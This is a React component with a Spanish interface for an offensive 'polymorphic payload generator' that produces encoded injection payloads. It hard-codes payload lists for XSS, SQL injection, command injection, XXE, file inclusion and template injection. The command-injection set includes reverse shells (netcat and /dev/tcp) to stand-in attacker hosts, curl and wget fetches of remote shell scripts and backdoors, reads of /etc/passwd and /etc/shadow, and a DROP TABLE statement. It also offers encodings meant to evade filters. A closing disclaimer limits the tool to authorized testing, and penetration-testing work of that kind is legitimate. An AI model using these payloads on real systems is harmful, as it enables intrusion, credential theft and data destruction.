import React, { useState } from 'react';
import { Link } from 'react-router-dom';

const NeonText = ({ text, className = "" }) => {
  return (
    <span className={`flex flex-wrap ${className}`}>
      {text.split("").map((char, index) => {
        if (char === " ") return <span key={index} className="mx-1">&nbsp;</span>;
        
        const rand = Math.random();
        let animClass = "anim-steady";
        
        if (rand > 0.92) {
          animClass = "anim-critical";
        } else if (rand > 0.75) {
          animClass = "anim-flicker";
        }

        const randomDuration = (Math.random() * 2 + 3).toFixed(2) + "s";
        const randomDelay = (Math.random() * 4).toFixed(2) + "s";

        return (
          <span
            key={index}
            className={animClass}
            style={{
              animationDuration: randomDuration,
              animationDelay: randomDelay,
              display: "inline-block"
            }}
          >
            {char}
          </span>
        );
      })}
    </span>
  );
};

const PayloadGenerator = () => {
  const [payloadType, setPayloadType] = useState('xss');
  const [customInput, setCustomInput] = useState('');
  const [generatedPayloads, setGeneratedPayloads] = useState([]);
  const [encoding, setEncoding] = useState('none');
  const [variantCount, setVariantCount] = useState(3);

  const payloadTemplates = {
    xss: [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      '<svg onload=alert("XSS")>',
      '"><script>alert(String.fromCharCode(88,83,83))</script>',
      '<iframe src="javascript:alert(\'XSS\')">',
      '<body onload=alert("XSS")>',
      '<input onfocus=alert("XSS") autofocus>',
      '<select onfocus=alert("XSS") autofocus>',
      '<textarea onfocus=alert("XSS") autofocus>',
      '<details open ontoggle=alert("XSS")>'
    ],
    sqli: [
      "' OR '1'='1",
      "' UNION SELECT NULL,NULL,NULL--",
      "admin'--",
      "' OR 1=1--",
      "' AND 1=0 UNION ALL SELECT 'admin', 'password'--",
      "1' ORDER BY 1--",
      "' UNION SELECT user(),database(),version()--",
      "1' AND '1'='1",
      "' OR 'x'='x",
      "'; DROP TABLE users--"
    ],
    rce: [
      '; ls -la',
      '| whoami',
      '`cat /etc/passwd`',
      '$(id)',
      '; nc -e /bin/sh attacker.com 4444',
      '| curl http://malicious.com/shell.sh | bash',
      '; wget http://evil.com/backdoor.sh',
      '`uname -a`',
      '$(cat /etc/shadow)',
      '; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
    ],
    xxe: [
      '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
      '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
      '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><data>&file;</data>',
      '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]><foo>&xxe;</foo>'
    ],
    lfi: [
      '../../../etc/passwd',
      '....//....//....//etc/passwd',
      '/var/log/apache2/access.log',
      'php://filter/convert.base64-encode/resource=index.php',
      'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=',
      '..%2F..%2F..%2Fetc%2Fpasswd',
      'file:///etc/passwd',
      '/proc/self/environ'
    ],
    ssti: [
      '{{7*7}}',
      '{{config.items()}}',
      '{{request.application.__globals__.__builtins__.__import__(\'os\').popen(\'id\').read()}}',
      '{%for c in [].__class__.__base__.__subclasses__()%}{%if c.__name__==\'catch_warnings\'%}{{c()._module.__builtins__}}{% endif %}{% endfor %}',
      '{{request.__class__}}',
      '{{config.__class__.__init__.__globals__}}'
    ]
  };

  const encodingTypes = ['none', 'url', 'base64', 'hex', 'unicode', 'html'];

  const applyEncoding = (payload, encodingType) => {
    switch(encodingType) {
      case 'url':
        return encodeURIComponent(payload);
      case 'base64':
        return btoa(payload);
      case 'hex':
        return Array.from(payload).map(c => c.charCodeAt(0).toString(16)).join('');
      case 'unicode':
        return Array.from(payload).map(c => '\\u' + ('0000' + c.charCodeAt(0).toString(16)).slice(-4)).join('');
      case 'html':
        return Array.from(payload).map(c => `&#${c.charCodeAt(0)};`).join('');
      default:
        return payload;
    }
  };

  const generatePayload = () => {
    const templates = payloadTemplates[payloadType];
    const results = [];

    // Si hay input personalizado, úsalo; si no, usa plantillas aleatorias
    const basePayloads = customInput 
      ? [customInput] 
      : Array.from({ length: variantCount }, () => 
          templates[Math.floor(Math.random() * templates.length)]
        );

    if (encoding === 'todos') {
      // Generar variantes con diferentes encodings
      basePayloads.forEach((basePayload, index) => {
        const encodingType = encodingTypes.filter(e => e !== 'none')[index % (encodingTypes.length - 1)];
        const encoded = applyEncoding(basePayload, encodingType);
        results.push({
          id: results.length + 1,
          payload: encoded,
          encoding: encodingType,
          original: basePayload
        });
      });

      // Si pedimos más variantes que tipos de encoding, generar combinaciones
      while (results.length < variantCount) {
        const basePayload = customInput || templates[Math.floor(Math.random() * templates.length)];
        const randomEncoding = encodingTypes.filter(e => e !== 'none')[
          Math.floor(Math.random() * (encodingTypes.length - 1))
        ];
        const encoded = applyEncoding(basePayload, randomEncoding);
        results.push({
          id: results.length + 1,
          payload: encoded,
          encoding: randomEncoding,
          original: basePayload
        });
      }
    } else {
      // Generar variantes con el encoding seleccionado
      basePayloads.forEach((basePayload) => {
        const encoded = applyEncoding(basePayload, encoding);
        results.push({
          id: results.length + 1,
          payload: encoded,
          encoding: encoding,
          original: basePayload
        });
      });
    }

    setGeneratedPayloads(results.slice(0, variantCount));
  };

  const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text);
    alert('Payload copiado al portapapeles!');
  };

  const copyAllPayloads = () => {
    const allPayloads = generatedPayloads.map(p => p.payload).join('\n\n');
    navigator.clipboard.writeText(allPayloads);
    alert('Todos los payloads copiados al portapapeles!');
  };

  return (
    <div className="min-h-screen bg-gray-900 text-white p-8">
      <Link to="/" className="text-cyan-400 hover:text-cyan-300 mb-6 inline-block transition-colors">
        ← Volver al menú principal
      </Link>
      
      <div className="max-w-6xl mx-auto">
        <h1 className="text-4xl font-bold mb-8 text-center">
          <NeonText text="Generador de Payloads Polimórficos" className="text-3xl md:text-4xl" />
        </h1>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
          {/* Tipo de Payload */}
          <div className="neon-card p-6 rounded-lg backdrop-blur-sm bg-gray-800/50 border-2 border-purple-500/50">
            <label className="block text-cyan-400 font-bold mb-3">Tipo de Payload</label>
            <select 
              value={payloadType}
              onChange={(e) => setPayloadType(e.target.value)}
              className="w-full bg-gray-900 text-white border-2 border-cyan-500/50 rounded px-4 py-2 focus:outline-none focus:border-cyan-500"
            >
              <option value="xss">XSS (Cross-Site Scripting)</option>
              <option value="sqli">SQLi (SQL Injection)</option>
              <option value="rce">RCE (Remote Code Execution)</option>
              <option value="xxe">XXE (XML External Entity)</option>
              <option value="lfi">LFI (Local File Inclusion)</option>
              <option value="ssti">SSTI (Server-Side Template Injection)</option>
            </select>
          </div>

          {/* Encoding */}
          <div className="neon-card p-6 rounded-lg backdrop-blur-sm bg-gray-800/50 border-2 border-purple-500/50">
            <label className="block text-cyan-400 font-bold mb-3">Encoding</label>
            <select 
              value={encoding}
              onChange={(e) => setEncoding(e.target.value)}
              className="w-full bg-gray-900 text-white border-2 border-cyan-500/50 rounded px-4 py-2 focus:outline-none focus:border-cyan-500"
            >
              <option value="none">Ninguno</option>
              <option value="url">URL Encoding</option>
              <option value="base64">Base64</option>
              <option value="hex">Hexadecimal</option>
              <option value="unicode">Unicode</option>
              <option value="html">HTML Entities</option>
              <option value="todos">🎲 Todos (Aleatorio)</option>
            </select>
          </div>
        </div>

        {/* Input Personalizado */}
        <div className="neon-card p-6 rounded-lg backdrop-blur-sm bg-gray-800/50 border-2 border-purple-500/50 mb-6">
          <label className="block text-cyan-400 font-bold mb-3">Payload Personalizado (Opcional)</label>
          <textarea
            value={customInput}
            onChange={(e) => setCustomInput(e.target.value)}
            placeholder="Ingresa tu propio payload o deja vacío para usar plantillas aleatorias..."
            className="w-full bg-gray-900 text-white border-2 border-cyan-500/50 rounded px-4 py-3 h-32 focus:outline-none focus:border-cyan-500 font-mono text-sm"
          />
        </div>

        {/* Slider de Variantes */}
        <div className="neon-card p-6 rounded-lg backdrop-blur-sm bg-gray-800/50 border-2 border-purple-500/50 mb-6">
          <div className="flex justify-between items-center mb-3">
            <label className="text-cyan-400 font-bold">Número de Variantes</label>
            <span className="text-pink-400 font-bold text-2xl">{variantCount}</span>
          </div>
          <input
            type="range"
            min="1"
            max="20"
            value={variantCount}
            onChange={(e) => setVariantCount(parseInt(e.target.value))}
            className="w-full h-2 bg-gray-700 rounded-lg appearance-none cursor-pointer slider hover:bg-gray-600 transition-colors"
          />
          <div className="flex justify-between text-xs text-gray-400 mt-2">
            <span>1</span>
            <span>20</span>
          </div>
        </div>

        {/* Botón Generar */}
        <div className="text-center mb-6">
          <button
            onClick={generatePayload}
            className="bg-gradient-to-r from-purple-600 to-cyan-500 hover:from-purple-700 hover:to-cyan-600 text-white font-bold py-3 px-8 rounded-lg transition-all duration-300 shadow-lg hover:shadow-cyan-500/50 transform hover:scale-105"
          >
            GENERAR PAYLOADS
          </button>
        </div>

        {/* Resultados */}
        {generatedPayloads.length > 0 && (
          <div className="space-y-4">
            <div className="flex justify-between items-center mb-4">
              <h2 className="text-2xl font-bold text-cyan-400">
                Payloads Generados ({generatedPayloads.length})
              </h2>
              <button
                onClick={copyAllPayloads}
                className="text-cyan-400 hover:text-cyan-300 transition-colors text-sm font-bold flex items-center space-x-2"
              >
                <span>📋</span>
                <span>COPIAR TODOS</span>
              </button>
            </div>

            {generatedPayloads.map((item) => (
              <div 
                key={item.id}
                className="neon-card p-6 rounded-lg backdrop-blur-sm bg-gray-800/50 border-2 border-green-500/50"
              >
                <div className="flex justify-between items-center mb-3">
                  <div className="flex items-center space-x-3">
                    <span className="text-green-400 font-bold">Variante #{item.id}</span>
                    <span className="text-xs px-3 py-1 rounded-full bg-purple-500/20 border border-purple-500 text-purple-400">
                      {item.encoding === 'none' ? 'Sin Encoding' : item.encoding.toUpperCase()}
                    </span>
                  </div>
                  <button
                    onClick={() => copyToClipboard(item.payload)}
                    className="text-cyan-400 hover:text-cyan-300 transition-colors text-sm font-bold"
                  >
                    📋 COPIAR
                  </button>
                </div>
                
                {/* Payload Original (si hay encoding aplicado) */}
                {item.encoding !== 'none' && (
                  <div className="mb-3">
                    <div className="text-gray-400 text-xs mb-1">Original:</div>
                    <div className="bg-gray-900/50 text-gray-400 border border-gray-700 rounded px-4 py-2 font-mono text-sm break-all">
                      {item.original}
                    </div>
                  </div>
                )}
                
                {/* Payload Encoded */}
                <div>
                  <div className="text-green-400 text-xs mb-1">
                    {item.encoding !== 'none' ? 'Encoded:' : 'Payload:'}
                  </div>
                  <div className="bg-gray-900 text-green-400 border-2 border-green-500/50 rounded px-4 py-3 font-mono text-sm break-all">
                    {item.payload}
                  </div>
                </div>
              </div>
            ))}
          </div>
        )}

        {/* Info Card */}
        <div className="mt-8 neon-card p-6 rounded-lg backdrop-blur-sm bg-gray-800/50 border-2 border-yellow-500/50">
          <h3 className="text-yellow-400 font-bold mb-3">⚠️ ADVERTENCIA</h3>
          <p className="text-gray-300 text-sm">
            Este generador es para propósitos educativos y pruebas de penetración autorizadas únicamente. 
            El uso indebido de estos payloads puede ser ilegal. Asegúrate de tener autorización antes de 
            realizar cualquier prueba de seguridad.
          </p>
        </div>
      </div>

      <style jsx>{`
        .neon-card {
          box-shadow: 0 0 15px rgba(139, 92, 246, 0.3);
        }
        .neon-card:hover {
          box-shadow: 0 0 25px rgba(6, 182, 212, 0.5);
        }
        
        /* Estilos personalizados para el slider */
        .slider::-webkit-slider-thumb {
          -webkit-appearance: none;
          appearance: none;
          width: 18px;
          height: 18px;
          border-radius: 50%;
          border: 0.01px solid #fff;
          cursor: pointer;
          background: linear-gradient(250deg, #ae6dec, #02b1d0);
          box-shadow: 0 0 10px rgba(6, 182, 212, 0.8);
          margin-top: -5px;
        }
        
        .slider::-moz-range-thumb {
          width: 18px;
          height: 18px;
          border-radius: 50%;
          cursor: pointer;
          border: none;
          box-shadow: 0 0 10px rgba(6, 182, 212, 0.8);
        }
        
        .slider::-webkit-slider-runnable-track {
          background: linear-gradient(90deg, #a855f7 0%, #06b6d4 100%);
          height: 6px;
          border-radius: 3px;
        }
        
        .slider::-moz-range-track {
          background: linear-gradient(90deg, #a855f7 0%, #06b6d4 100%);
          height: 6px;
          border-radius: 3px;
        }
      `}</style>
    </div>
  );
};

export default PayloadGenerator;